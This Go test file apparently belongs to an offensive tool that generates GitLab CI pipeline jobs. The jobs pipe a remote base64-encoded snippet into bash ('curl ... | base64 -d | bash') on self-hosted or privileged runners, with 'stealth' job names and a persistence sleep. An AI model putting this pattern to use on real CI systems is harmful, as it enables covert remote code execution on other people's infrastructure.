package ror

import (
	"strings"
	"testing"
)

func TestGeneratePipelineYAML_Basic(t *testing.T) {
	yaml := GeneratePipelineYAML("https://gitlab.com/snippets/123/raw", []string{"self-hosted"}, false, "", "", 0)

	if !strings.Contains(yaml, "build_job:") {
		t.Error("expected default job name 'build_job'")
	}
	if !strings.Contains(yaml, "stage: build") {
		t.Error("expected default stage 'build'")
	}
	if !strings.Contains(yaml, "curl -s https://gitlab.com/snippets/123/raw | base64 -d | bash") {
		t.Error("expected snippet curl command")
	}
	if !strings.Contains(yaml, "- self-hosted") {
		t.Error("expected runner tag")
	}
}

func TestGeneratePipelineYAML_CustomNames(t *testing.T) {
	yaml := GeneratePipelineYAML("https://example.com/snippet", []string{"docker"}, false, "my-job", "deploy", 0)

	if !strings.Contains(yaml, "my-job:") {
		t.Error("expected custom job name")
	}
	if !strings.Contains(yaml, "stage: deploy") {
		t.Error("expected custom stage name")
	}
}

func TestGeneratePipelineYAML_Stealth(t *testing.T) {
	yaml := GeneratePipelineYAML("https://example.com/snippet", nil, true, "", "", 0)

	// Should not contain defaults when stealth is on
	if strings.Contains(yaml, "build_job:") {
		t.Error("stealth mode should use benign job name, not default")
	}
}

func TestGeneratePipelineYAML_Persist(t *testing.T) {
	yaml := GeneratePipelineYAML("https://example.com/snippet", []string{"nuc"}, false, "", "", 5)

	if !strings.Contains(yaml, "sleep 300") {
		t.Error("expected sleep command for 5 minutes")
	}
}

func TestGeneratePipelineYAML_NoTags(t *testing.T) {
	yaml := GeneratePipelineYAML("https://example.com/snippet", nil, false, "", "", 0)

	if strings.Contains(yaml, "tags:") {
		t.Error("expected no tags section when no tags provided")
	}
}

func TestGeneratePipelineYAML_MultipleTags(t *testing.T) {
	yaml := GeneratePipelineYAML("https://example.com/snippet", []string{"privileged", "nuc", "docker"}, false, "", "", 0)

	if !strings.Contains(yaml, "- privileged") {
		t.Error("expected privileged tag")
	}
	if !strings.Contains(yaml, "- nuc") {
		t.Error("expected nuc tag")
	}
	if !strings.Contains(yaml, "- docker") {
		t.Error("expected docker tag")
	}
}

func TestGeneratePipelineYAML_ExplicitNameOverridesStealth(t *testing.T) {
	yaml := GeneratePipelineYAML("https://example.com/snippet", nil, true, "custom-job", "custom-stage", 0)

	if !strings.Contains(yaml, "custom-job:") {
		t.Error("explicit job name should override stealth")
	}
	if !strings.Contains(yaml, "stage: custom-stage") {
		t.Error("explicit stage name should override stealth")
	}
}
